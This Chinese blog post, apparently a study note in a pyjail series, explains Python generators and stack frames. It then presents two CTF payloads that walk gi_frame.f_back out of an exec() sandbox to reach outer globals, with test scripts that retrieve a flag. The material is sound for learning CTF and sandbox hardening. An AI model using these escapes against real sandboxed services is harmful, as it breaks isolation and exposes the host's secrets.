---
title: pyjail bypass-11 利用生成器栈逃逸
date: 2024-11-09 14:23:57
categories:
- Python
tags:
- pyjail
image:
  path: /assets/images/pyjail.jpg
toc: true
---

> - [pyjail 沙箱逃逸原理](/posts/python-沙箱逃逸原理/)
> - [绕过删除模块或方法](/posts/pyjail-bypass-01-绕过删除模块或方法/)
- [绕过基于字符串匹配的过滤](/posts/pyjail-bypass-02-字符串变换绕过/)
- [绕过命名空间限制](/posts/pyjail-bypass-03-绕过命名空间限制/)
- [绕过多行限制](/posts/pyjail-bypass-05-绕过长度限制/)
- [绕过长度限制](/posts/pyjail-bypass-04-绕过多行限制/)
- [变量覆盖与函数篡改](/posts/pyjail-bypass-06-变量覆盖与函数篡改/)
- [绕过 audit hook](/posts/pyjail-bypass-07-绕过-audit-hook/)
- [绕过 AST 沙箱](/posts/pyjail-bypass-08-绕过-AST-沙箱/)
- [绕过输出限制](/posts/pyjail-bypass-09-绕过输出限制/)
- [绕过 opcode 沙箱](/posts/pyjail-bypass-10-绕过-opcode-沙箱/)
- [利用生成器栈](/posts/pyjail-bypass-11-利用生成器栈/)

本文仅作为个人学习记录，大部分参考自下面的文章，讲解得非常细致：
- [利用生成器栈帧逃逸 Pyjail - CISCN 2024 mossfern 题解](https://pid-blog.com/article/frame-escape-pyjail#%E9%A2%98%E8%A7%A3%EF%BC%9Amossfern)

## 利用生成器栈帧进行逃逸

### 生成器
在 Python 中，生成器（Generator）是一种特殊的迭代器，它能够逐个生成值，而不需要一次性将所有值存储在内存中。生成器的主要特点是它们能够 惰性计算，即按需生成数据，这使得它们在处理大量数据或无限序列时非常高效。

生成器通过使用 yield 关键字来返回值，而不是像普通函数那样使用 return。当一个函数包含 yield 时，它就成为了一个生成器函数。调用这个函数不会立即执行，而是返回一个生成器对象。每次调用生成器对象的 next() 方法时，函数会从上次暂停的地方继续执行，直到再次遇到 yield 或结束。
#### 创建生成器
创建生成器有以下两种方法：
1. 使用 yield 关键字
    ```py
    def my_generator():
        yield 1
        yield 2
        yield 3

    gen = my_generator()
    print(type(gen)) # <class 'generator'>
    print(gen)       # <generator object my_generator at 0x7f4a20e049e0>

    print(next(gen))  # 输出: 1
    print(next(gen))  # 输出: 2
    print(next(gen))  # 输出: 3
    ```
2. 使用生成器表达式。类似于列表推导式，但使用小括号 () 而不是方括号 [] 来创建生成器表达式。
    ```py
    gen_exp = (x * x for x in range(5))

    for num in gen_exp:
        print(num)
    ```
#### 生成器转化为列表
生成器转换为列表可以使用如下的几种方式：
1. list 构造函数
2. 列表推导式
3.  `*` 解包操作符
```py
gen = (x for x in range(5))  
lst = list(gen)

gen = (x for x in range(5))  
lst = [x for x in gen]

gen = (x for x in range(5))  
lst = [*gen]
```


### 栈帧
在 Python 中，栈帧（Stack Frame）是每次函数调用时创建的执行上下文。每个栈帧包含了函数的局部变量、参数、返回地址等信息，并且这些栈帧按照调用顺序被压入 调用栈（Call Stack）中。

#### 获取栈帧
获取栈帧的基本方法是使用 sys._getframe 方法：
```py
import sys
f1 = sys._getframe()
print(f1)
# <frame at 0x7fb8d49984a0, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack.py', line 3, code <module>>
print(type(f1)) # <class 'frame'>
```
f1 就是一个栈帧对象。

另一种方法是用 inspect 库的 currentframe 方法
```py
import inspect
f2 = inspect.currentframe()
```
#### 交互式命令行的差异
注意，由于 Python 交互式命令行在执行代码时会使用单独的栈帧，因此下面的代码在交互式命令行与脚本文件中执行的结果不同。
```py
>>> import sys
>>> f1 = sys._getframe()
>>> f2 = sys._getframe()
>>> f1 == f2
False
```
直接执行脚本文件时返回 True
```py
import sys
f1 = sys._getframe()
print(f1)
print(type(f1))
f2 = sys._getframe()
print(f1 == f2) # True
```
#### 栈帧工作原理
栈帧的工作原理如下：
1. 当程序开始执行时，会创建一个==全局帧（global frame）==，它是整个程序的顶层上下文。
2. 每当==调用一个函数时，Python 会创建一个新的栈帧，并将其压入调用栈顶部==。
3. ==当函数完成执行后，当前栈帧会被弹出，并将控制权返回给上一个栈帧==。
4. 这种过程持续进行，直到所有函数都执行完毕，最终回到全局帧。

```py
import sys
frame = sys._getframe()
print(f"global frame: {frame}")
def add(a, b):
    frame = sys._getframe()  # 获取当前的栈帧
    print(f"add() frame: {frame}")
    return a + b

def multiply(x, y):
    frame = sys._getframe()  # 获取当前的栈帧
    print(f"multiply() frame: {frame}")
    return add(x, y) * y

result = multiply(2, 3)
print(f"Result: {result}")

# global frame: <frame at 0x7f5793d5a400, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack_1.py', line 3, code <module>>
# multiply() frame: <frame at 0x7f5793d35480, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack_1.py', line 11, code multiply>
# add() frame: <frame at 0x7f5793d34940, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack_1.py', line 6, code add>
```

#### 栈帧的内容
使用 dir 查看栈帧的内容：
```py
dir(f1)
# ['__class__',
#  '__delattr__',
#  '__dir__',
#  '__doc__',
#  '__eq__',
#  '__format__',
#  '__subclasshook__',
#  ...
#  'clear',
#  'f_back',
#  'f_builtins',
#  'f_code',
#  'f_globals',
#  'f_lasti',
#  'f_lineno',
#  'f_locals',
#  'f_trace',
#  'f_trace_lines',
#  'f_trace_opcodes']
```
除了 Object 共有的属性之外，有一些 f_ 开头的属性是栈帧对象独有的。
- f_back：它是指向上一个栈帧的指针。在 Python 中，f1.f_back 拿到的也是一个栈帧对象。
- f_builtins、f_globals、f_locals：对应着当前栈帧的 builtins、globals、locals 对象。

我们可以使用前面的脚本进行测试：

```py
import sys
global_frame = sys._getframe()
multiply_frame = None
add_frame = None
# print(f"global frame: {global_frame}")
def add(a, b):
    add_frame = sys._getframe()  # 获取当前的栈帧
    # print(f"add() frame: {frame}")
    print(multiply_frame == add_frame.f_back)
    return a + b

def multiply(x, y):
    global multiply_frame
    multiply_frame = sys._getframe()  # 获取当前的栈帧
    # print(f"multiply() frame: {frame}")
    print(global_frame == multiply_frame.f_back)
    return add(x, y) * y

result = multiply(2, 3)
print(f"Result: {result}")

# True
# True
# Result: 15
```


### 生成器的栈帧

每次调用一个普通函数时，Python 会为该函数创建一个新的栈帧，并将其压入调用栈中。当函数执行完毕后，栈帧会被弹出。生成器的实现也使用到了栈帧，但不同的是，生成器可以暂停执行，并在恢复时继续从暂停的位置执行，也就意味着生成器的栈帧行为有所区别。

下面是一个测试示例：
```py
import sys

def my_generator():
    print(f"Generator started, frame: {sys._getframe()}")
    yield 1
    print(f"After first yield, frame: {sys._getframe()}")
    yield 2
    print(f"After second yield, frame: {sys._getframe()}")
    yield 3

gen = my_generator()

# 第一次调用 next()，启动生成器
print(next(gen))  # 输出: 1
# 第二次调用 next()，继续执行
print(next(gen))  # 输出: 2
# 第三次调用 next()，继续执行
print(next(gen))  # 输出: 3

# Generator started, frame: <frame at 0x7fe3333b09e0, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack_3.py', line 4, code my_generator>
# 1
# After first yield, frame: <frame at 0x7fe3333b09e0, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack_3.py', line 6, code my_generator>
# 2
# After second yield, frame: <frame at 0x7fe3333b09e0, file '/mnt/share/project/46_Training/web_security_basic/pyjail-labs/test/test_stack_3.py', line 8, code my_generator>
# 3
```
每次调用 next() 时，生成器会从上次暂停的位置继续执行，并且它的栈帧保持不变。这表明，在整个生命周期中，生成器的栈帧一直存在，并且保存着它的状态。

我们可以使用 dir 函数来查看生成器的内容
```py
g = (1 for _ in [1,2,3])
dir(g)
# ['__class__',
#  '__del__',
#  '__delattr__',
#  ... ,
#  'close',
#  'gi_code',
#  'gi_frame',
#  'gi_running',
#  'gi_suspended',
#  'gi_yieldfrom',
#  'send',
#  'throw']
g.gi_frame  # <frame at 0x102bd4880, file '/code.py', line 1, code <genexpr>>
```
生成器对象自身也存在一些独有的属性，以 gi_开头:
- gi_frame: gi_frame 就是生成器的栈帧，生成器每次执行，栈帧的地址保持不变。

### 生成器栈帧逃逸 payload
下面是博客 [利用生成器栈帧逃逸 Pyjail | CISCN 2024 mossfern 题解](https://pid-blog.com/article/frame-escape-pyjail#%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E6%A0%88%E5%B8%A7) 给出的一段抽象逻辑：

```py
flag = "flag{12345}"
code = """<<用户提供的 Python 代码>>"""
... # 对 code 进行严防死守的过滤
compiled_code = compile(code)
... # 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)
```

用户的代码被丢进exec中执行。经过严格的过滤后，import、魔术方法、builtins 等沙箱逃逸的常用思路都会被堵死。这时候想要逃逸到 exec 环境之外拿到flag，甚至是 RCE，就需要通过栈帧回溯来实现。

#### payload1
文章 [利用生成器栈帧逃逸 Pyjail | CISCN 2024 mossfern 题解](https://pid-blog.com/article/frame-escape-pyjail#%E7%94%9F%E6%88%90%E5%99%A8%E7%9A%84%E6%A0%88%E5%B8%A7) 给出的 payload 如下：

```py
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = [*q][0]
# g 现在是 exec 之外的栈帧的 globals 了
# g 是一个 dict，其中包含 flag 变量
```
要理解上面的表达式，需要明白：
1. ==生成器在初始化时并不会立即执行==。q 初始化之后并不会立即执行，而是到 [*q] 时才执行。因此乍一眼看有语法问题，q 并没有定义啊？但是当其执行时，q 已经是一个生成器对象了。
2. f_back 属性用于访问调用栈中的前一个栈帧。

因此：
- q.gi_frame 是生成器对象 q 的当前栈帧。
- q.gi_frame.f_back 得到的是 exec 函数的栈帧，
- q.gi_frame.f_back.f_back 得到的就是全局栈帧了。
- q.gi_frame.f_back.f_back.f_globals 得到的就是 globals() 函数的内容。

builtins 和 locals 也可以同理拿到。

作者提到为什么非得把 q.gi_frame 写在生成器里面？为什么不能写成下面这样：
```py
q = (1 for _ in [1])
g = q.gi_frame.f_back.f_back.f_globals
```

原因在于只有在生成器运行过程中，q.gi_frame.f_back 才不为 None（CPython 中定义的逻辑）。即使 q 已经是一个生成器，但是由于并没有进行解包操作，生成器并没有运行，所以 q.gi_frame.f_back 始终为 None，如果没有解包的话，即使像上面那样写，结果也是 None。
```py
q = (q.gi_frame.f_back.f_back.f_globals for _ in [1])
g = q.gi_frame.f_back
# None
```

测试脚本：
```py
flag = "flag{12345}"
code = """q = (q.gi_frame.f_back.f_back.f_globals for _ in [1]);g = [*q][0];print(g)"""
# 对 code 进行严防死守的过滤
compiled_code = compile(code,"<sandbox>", "exec")
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)
```

#### payload2
[[DiceCTF 2024] IRS](https://maplebacon.org/2024/02/dicectf2024-irs/) 这篇博客也给出了一个生成器栈帧的 payload：
```py
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)
```
如何理解这段代码：
1. 首先声明了一个生成器 f，
   1. f 内部声明了全局变量 x 和 frame，意味着会在函数外部对其进行操作。
2. x = f() 会实例化一个生成器，但由于生成器的延迟加载，此时生成器不会执行。
3. x.send(None)：这行代码启动了生成器，并让它执行到第一个 yield 语句。

ps: 文章作者这段 payload 与上面那种 payload 的区别再于没有显示定一个生成器，AST 中不会出现 ast.GeneratorExp。

测试代码如下：
```py
flag = "flag{12345}"
code = '''
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
'''

compiled_code = compile(code,"<sandbox>", "exec")
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)
```

### CSICN 2024 mossfern

## 参考资料
- [利用生成器栈帧逃逸 Pyjail | CISCN 2024 mossfern 题解](https://pid-blog.com/article/frame-escape-pyjail#%E9%A2%98%E8%A7%A3%EF%BC%9Amossfern)